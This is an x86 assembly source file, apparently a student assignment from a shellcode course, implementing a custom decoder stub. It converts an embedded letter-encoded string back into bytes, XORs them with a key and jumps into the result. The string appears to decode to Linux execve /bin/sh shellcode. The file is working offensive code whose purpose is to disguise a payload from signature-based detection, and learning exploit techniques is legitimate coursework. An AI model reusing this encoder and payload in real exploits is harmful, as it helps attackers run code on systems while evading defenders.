; A4 - Custom Encoding Scheme
; William Moody
; PA-25640
; 28.12.2021

global _start
section .text

_start:

	jmp short call_decoder

decoder:

	pop esi					; ESI points to shellcode
	xor ecx, ecx				; ECX is the offset to write location,
						; ECX*2 is the offset to read location

decode_loop:

	mov ax, word [esi+ecx*2]		; ah = shellcode[i], al = shellcode[i+1]
	sub ax, 0x6161				; ah -= 97, ah -= 97
	shl al, 0x4				; al = 0xA -> 0xA0
	add al, ah				; ah = 0xB -> al = 0xAB

	; === PASTE KEY FROM ENCODER HERE ===
	xor al, 0x41				; al = 0xAB ^ key
	; ===================================

	mov [esi+ecx], byte al			; shellcode[j] = al
	inc ecx					; Increment offset(s) to read/write locations

	; === PASTE LENGTH FROM ENCODER HERE ===
	cmp ecx, 0x1d
	; ======================================
	
	jnae decode_loop			; Loop if i < len(shellcode)
	jmp short shellcode 			; Hand over control to decoded shellcode

call_decoder:

	call decoder

	; === PASTE SHELLCODE FROM ENCODER HERE ===
	shellcode: db "haibpbcjbbcjgocdcadccjgocdcicpmikchaibbbmikdbcmikapbekimmb"
	; =========================================
